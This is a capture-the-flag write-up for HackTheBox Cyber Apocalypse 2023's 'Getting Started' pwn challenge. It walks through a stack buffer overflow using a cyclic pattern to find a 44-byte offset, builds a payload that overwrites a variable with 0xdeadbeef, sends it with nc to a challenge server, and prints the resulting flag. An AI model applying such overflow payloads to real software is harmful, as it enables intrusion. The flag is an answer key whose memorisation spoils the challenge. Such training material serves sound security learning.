---
name: Getting Started (2023)
event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
category: Pwn
description: Writeup for Getting Started (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Getting Started

## Description

> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

## Solution

Generate a cyclic pattern and send it to the program as input and check which bytes make it into the RIP, then unhex and find the offset.

{% code overflow="wrap" %}
```bash
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

unhex 6161616c6161616b

cyclic -l laaa
44
```
{% endcode %}

Create a payload and send it to the server.

{% code overflow="wrap" %}
```bash
python2 -c 'print "A" * 44 + "\xef\xbe\xad\xde"' > payload

nc 209.97.129.76 30115 < payload
```
{% endcode %}

Receive flag 🙂

{% code overflow="wrap" %}
```bash
      [Addr]       |      [Value]
-------------------+-------------------
0x00007ffd6d3fc690 | 0x4141414141414141 <- Start of buffer
0x00007ffd6d3fc698 | 0x4141414141414141
0x00007ffd6d3fc6a0 | 0x4141414141414141
0x00007ffd6d3fc6a8 | 0x4141414141414141
0x00007ffd6d3fc6b0 | 0x4141414141414141 <- Dummy value for alignment
0x00007ffd6d3fc6b8 | 0xdeadbeef41414141 <- Target to change
0x00007ffd6d3fc6c0 | 0x0000557386505800 <- Saved rbp
0x00007ffd6d3fc6c8 | 0x00007f02fd685c87 <- Saved return address
0x00007ffd6d3fc6d0 | 0x0000000000000001
0x00007ffd6d3fc6d8 | 0x00007ffd6d3fc7a8

HTB{b0f_s33m5_3z_r1ght?}
```
{% endcode %}
